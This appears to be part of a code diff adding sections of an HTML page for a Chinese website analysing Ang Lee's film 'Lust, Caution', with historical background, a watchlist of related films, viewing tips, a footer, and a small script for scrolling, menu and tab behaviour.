+        <h2 class="heading" id="tContext">历史与<em>文本</em> · 故事背后那座城</h2>
+        <p class="intro">《色，戒》不是架空寓言。1940 年代的上海、香港、汪伪政权、话剧社、旗袍与三轮车——每一处细节都有据可依。</p>
+        <div class="bar"></div>
+      </div>
+    </header>
+
+    <div class="fold">
+      <article class="page show-up">
+        <span class="tag">时代</span>
+        <h3>1940 年代的上海：<br>繁华是薄的，恐惧是厚的</h3>
+        <p>影片中的上海处于日据与汪伪时期。舞厅、咖啡馆、旗袍依旧，但每扇门后都可能有人监听。王佳芝的"表演"之所以成立，正因为整座城市都在表演。</p>
+        <a class="more" href="#">延伸阅读：沦陷时期的上海日常 →</a>
+      </article>
+      <article class="page t2 show-up">
+        <span class="tag">文本</span>
+        <h3>张爱玲的冷笔：<br>一万字，写尽一生</h3>
+        <p>张爱玲 1950 年写下短篇小说《色，戒》，取材自抗战时期的真实刺杀传闻。她的王佳芝没有悲情，只有一句"到女人心里的路通过阴道"的残忍洞察。李安的改编，是把冷笔捂热。</p>
+        <a class="more" href="#">原著与剧本对照 →</a>
+      </article>
+      <article class="page t3 show-up">
+        <span class="tag">分级</span>
+        <h3>III 级与金狮：<br>尺度之外的尺度</h3>
+        <p>影片在香港被列为 III 级（只准 18 岁及以上观看），同年拿下第 64 届威尼斯电影节金狮奖。分级是行政判断，艺术评价是审美判断——两者并不矛盾，却被大众长期混为一谈。</p>
+        <a class="more" href="#">看懂电影分级制度 →</a>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目五：延伸片单 ==================== -->
+<section class="block" id="more" aria-labelledby="tMore">
+  <div class="box">
+    <header class="head-flex show-up">
+      <div>
+        <span class="kicker">05 / WATCHLIST</span>
+        <h2 class="heading" id="tMore">延伸<em>片单</em> · 看完《色，戒》该接着看什么</h2>
+        <p class="intro">横向比较，才能看出李安的位置。以下七部同题异作，分别回应"欲望、权力、身份、孤独"——左右滑动，一格一格挑。</p>
+        <div class="bar"></div>
+      </div>
+      <div class="tabs" role="tablist">
+        <button class="tab on" role="tab" aria-selected="true">华语</button>
+        <button class="tab" role="tab">亚洲</button>
+        <button class="tab" role="tab">西方</button>
+      </div>
+    </header>
+
+    <div class="pick-wrap">
+      <div class="pick-track">
+        <figure class="card">
+          <div class="post"><span class="yr">1994</span><span class="fill" style="background:linear-gradient(155deg,#2c1f26,#1c151c)"></span></div>
+          <figcaption><h4>《霸王别姬》</h4><small>陈凯歌 · 戏如人生，性别与忠诚</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">1997</span><span class="fill" style="background:linear-gradient(155deg,#1f2a30,#141c22)"></span></div>
+          <figcaption><h4>《春光乍泄》</h4><small>王家卫 · 亲密关系里的权力</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">1987</span><span class="fill" style="background:linear-gradient(155deg,#30241a,#201810)"></span></div>
+          <figcaption><h4>《胭脂扣》</h4><small>关锦鹏 · 情欲、等待与性别凝视</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">1992</span><span class="fill" style="background:linear-gradient(155deg,#241c2a,#181420)"></span></div>
+          <figcaption><h4>《阮玲玉》</h4><small>关锦鹏 · 被书写者的自我辩护</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">2000</span><span class="fill" style="background:linear-gradient(155deg,#26302a,#1a221c)"></span></div>
+          <figcaption><h4>《花样年华》</h4><small>王家卫 · 压抑、留白与道德边界</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">2018</span><span class="fill" style="background:linear-gradient(155deg,#1c2430,#141a22)"></span></div>
+          <figcaption><h4>《沦落人》</h4><small>陈小娟 · 尊严，是穷人最后的伦理</small></figcaption>
+        </figure>
+        <figure class="card">
+          <div class="post"><span class="yr">1996</span><span class="fill" style="background:linear-gradient(155deg,#2c2018,#1c1610)"></span></div>
+          <figcaption><h4>《英国病人》</h4><small>安东尼·明格拉 · 战争中的身体与记忆</small></figcaption>
+        </figure>
+      </div>
+    </div>
+
+    <div class="guide-note show-up">
+      <aside class="note-card">
+        <h4>观影提醒</h4>
+        <p>色戒电影网只做影片解读、历史背景与分级说明，不提供、不链接任何下载或在线播放资源。请通过正规院线、正版发行与持牌平台观看，尊重创作者与电影分级制度。</p>
+      </aside>
+      <div class="flow-txt">
+        <div class="row"><b>01</b><span><b>先看原片，别看解说。</b>伦理片的力气在节奏与留白，解说会替你下判断。</span></div>
+        <div class="row"><b>02</b><span><b>二刷时关掉字幕。</b>李安的镜头信息量，往往大于台词。</span></div>
+        <div class="row"><b>03</b><span><b>读一遍张爱玲原著。</b>万余字，半小时，你会重新理解王佳芝。</span></div>
+        <div class="row"><b>04</b><span><b>允许自己不舒服。</b>好的伦理电影不给答案，只给困境。</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer class="foot">
+  <div class="box">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="logo" href="#top"><span class="seal" aria-hidden="true">戒</span>色戒电影网<small>SEJIEDIANYINGWANG-CN</small></a>
+        <p>色戒电影网（sejiedianyingwang-cn）是一个专注于李安电影《色，戒》深度解读的中文研究站点：剧情脉络、人物心理、镜头语言、历史背景、张爱玲原著对照与分级说明。网站网址：https://域名.github.io</p>
+      </div>
+      <div class="foot-col">
+        <h5>内容栏目</h5>
+        <a href="#plot">剧情脉络</a>
+        <a href="#cast">人物关系</a>
+        <a href="#shot">镜头语言</a>
+        <a href="#context">历史与文本</a>
+        <a href="#more">延伸片单</a>
+      </div>
+      <div class="foot-col">
+        <h5>解读维度</h5>
+        <a href="#">身体与政治</a>
+        <a href="#">表演与身份</a>
+        <a href="#">权力与亲密</a>
+        <a href="#">信仰与背叛</a>
+        <a href="#">原著对照</a>
+      </div>
+      <div class="foot-col">
+        <h5>关于本站</h5>
+        <a href="#">选片标准</a>
+        <a href="#">分级说明</a>
+        <a href="#">投稿与合作</a>
+        <a href="#">免责声明</a>
+        <a href="#">意见反馈</a>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="year"></span> 色戒电影网 sejiedianyingwang-cn · 网站网址：https://域名.github.io · 保留所有权利</span>
+      <span><b>sejiedianyingwang-cn</b> · 为认真看电影的人而做</span>
+    </div>
+  </div>
+</footer>
+
+<a class="up" id="up" href="#top" aria-label="回到顶部" title="回到顶部">↑</a>
+
+<script>
+/* ---------- 交互：滚动监听 / 动效 / 移动菜单 / Tab ---------- */
+(function(){
+  var bar = document.getElementById('topbar');
+  var up = document.getElementById('up');
+  var burger = document.getElementById('burger');
+  var menu = document.getElementById('topLinks');
+  var links = menu.querySelectorAll('a:not(.top-cta)');
+  var ids = ['home','plot','cast','shot','context','more'];
+  var secs = ids.map(function(id){ return document.getElementById(id); });
+
+  function onScroll(){
+    var y = window.scrollY || document.documentElement.scrollTop;
+    bar.classList.toggle('stuck', y > 20);
+    up.classList.toggle('show', y > 600);
+    var idx = 0;
+    for (var i = 0; i < secs.length; i++){
+      if (secs[i] && secs[i].getBoundingClientRect().top <= 140) idx = i;
+    }
+    links.forEach(function(a, i){ a.classList.toggle('now', i === idx); });
+  }
+
+  burger.addEventListener('click', function(){
+    var open = menu.classList.toggle('open');
+    burger.setAttribute('aria-expanded', open ? 'true' : 'false');
+  });
+  links.forEach(function(a){
+    a.addEventListener('click', function(){
+      menu.classList.remove('open');
+      burger.setAttribute('aria-expanded', 'false');
+    });
+  });
+
+  if ('IntersectionObserver' in window){
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if (e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); }
+      });
+    }, { threshold: 0.12, rootMargin: '0px 0px -40px' });
+    document.querySelectorAll('.show-up').forEach(function(el){ io.observe(el); });
+  } else {
+    document.querySelectorAll('.show-up').forEach(function(el){ el.classList.add('in'); });
+  }
+
+  document.querySelectorAll('.tab').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var box = btn.closest('.head-flex');
+      box.querySelectorAll('.tab').forEach(function(x){ x.classList.remove('on'); x.setAttribute('aria-selected','false'); });
+      btn.classList.add('on');
+      btn.setAttribute('aria-selected', 'true');
+    });
+  });
+
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+  document.getElementById('year').textContent = new Date().getFullYear();
+})();
+</script>
+</body>
+</html>
